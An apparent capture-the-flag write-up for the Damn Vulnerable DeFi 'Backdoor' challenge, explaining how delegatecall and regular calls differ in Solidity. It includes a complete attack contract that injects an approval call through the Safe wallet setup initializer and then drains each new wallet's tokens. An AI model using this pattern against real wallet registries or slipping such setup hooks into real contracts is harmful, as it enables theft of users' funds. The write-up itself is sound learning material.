# Solving "The BackDoor" - My Journey 🕵️‍♂️

## Thoughts:

This challenge demonstrates how a seemingly correct setup can become a critical vulnerability. This attack exploits the **subtle** differences between _regular calls_ and _delegatecalls_ in Solidity, showing how one regular call in a chain of delegatecalls can completely change the execution context.

### The Core Problem

The challenge lies in gaining _approval_ from `proxy contracts` to transfer tokens that were deposited by the `registry`. The key insight is understanding how **msg.sender** changes (or doesn't change) through different call patterns.

### Attempted Solution #1: Direct ERC20.approve() Call

**SafeProxyFactory**

- call `SafeProxy.setup()`
- fallback
- delegatecall to `Singleton.setup()`
- delegatecall to `ERC20.approve()`

**Result**: `msg.sender` in `ERC20::approve()` = `SafeProxyFactory` ❌

_This doesn't work because delegatecall preserves the original caller throughout the chain._

### The Working Solution: Helper Contract Pattern

**SafeProxyFactory**

- call `SafeProxy.setup()`
- fallback
- delegatecall to `Singleton.setup()`
- delegatecall to `BackdoorAttack.approveFromProxy()`
- `BackdoorAttack` makes _REGULAR CALL_ to `ERC20.approve()`

**Result**: `msg.sender` in `ERC20::approve()` = Proxy address ✅

### Why the Helper Contract Works

When the Safe singleton delegates to our helper contract:

```javascript
// BackdoorAttack.approveFromProxy() - running in proxy context via delegatecall
function approveFromProxy(address token, address spender, uint256 amount) external {
    // msg.sender = SafeProxyFactory (preserved from original call)
    // address(this) = Proxy address (delegatecall context)

    // When we make this call:
    IERC20(token).approve(spender, amount);
    // This is a REGULAR CALL from the BackdoorAttack to ERC20 where the msg.sender becomes the immediate caller, in our case - proxy contract
}
```

### The Critical Insight

The helper contract (`BackdoorAttack`) code runs in the proxy's context due to **delegatecall**, but when the helper makes a regular call to _ERC20_, the call originates from `address(this)` (which is the proxy address in the delegatecall context).

<details>
<summary>The Complete Attack</summary>

```javascript
contract BackdoorAttack {
    SafeProxyFactory immutable i_factory;
    WalletRegistry immutable i_registry;
    Safe immutable i_singleton;
    address[] s_users;
    DamnValuableToken immutable i_token;
    address immutable i_recovery;

    constructor(
        SafeProxyFactory walletFactory,
        Safe singletonCopy,
        WalletRegistry walletRegistry,
        address[] memory users,
        DamnValuableToken token,
        address recovery
    ) {
        i_factory = walletFactory;
        i_singleton = singletonCopy;
        i_registry = walletRegistry;
        s_users = users;
        i_token = token;
        i_recovery = recovery;
    }

    function attack() external {
        for (uint256 i = 0; i < s_users.length; i++) {
            address[] memory owner = new address[](1);
            owner[0] = s_users[i];
            bytes memory helperData = abi.encodeCall(this.approveFromProxy, (address(i_token), address(this), 10e18));

            bytes memory initializer = abi.encodeCall(
                Safe.setup, (owner, 1, address(this), helperData, address(0), address(0), 0, payable(address(0)))
            );
            address proxy = address(i_factory.createProxyWithCallback(address(i_singleton), initializer, 0, i_registry));
            i_token.transferFrom(proxy, i_recovery, 10e18);
        }
    }

    function approveFromProxy(address token, address spender, uint256 amount) external {
        ERC20(token).approve(spender, amount);
    }

}
```

</details>

## Key Learnings

### The Delegatecall Context Rule

- **Delegatecall preserves:** `msg.sender`, `msg.value`, and `caller's context`
- **Delegatecall changes:** `address(this)` to the caller's address
- **Regular calls reset:** `msg.sender` becomes the immediate caller
